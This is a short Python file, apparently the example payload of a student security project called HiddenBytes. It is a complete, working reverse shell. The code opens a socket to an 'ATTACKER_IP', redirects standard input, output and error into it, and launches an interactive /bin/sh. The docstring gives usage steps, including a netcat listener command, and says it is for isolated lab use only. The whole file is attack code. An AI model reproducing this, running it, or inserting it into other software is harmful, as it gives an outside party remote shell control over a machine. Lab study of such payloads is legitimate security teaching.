"""
Reverse shell payload -- HiddenBytes project.

This is the example payload from the subject. The IP/port are
parameterized so you can point it at your OWN isolated VM during tests.

Usage (inside your isolated VM only):
    1. Start a listener on the attacker VM:   nc -lvnp 4444
    2. Run the generated polymorphic binary on the target VM.

Educational purposes only. Use exclusively in an isolated lab environment.
"""

import os
import socket
import subprocess

ATTACKER_IP = "192.168.56.10"   # <-- replace with your attacker VM's IP
ATTACKER_PORT = 4444            # <-- replace with your listener port


def reverse_shell() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/sh", "-i"])


if __name__ == "__main__":
    reverse_shell()
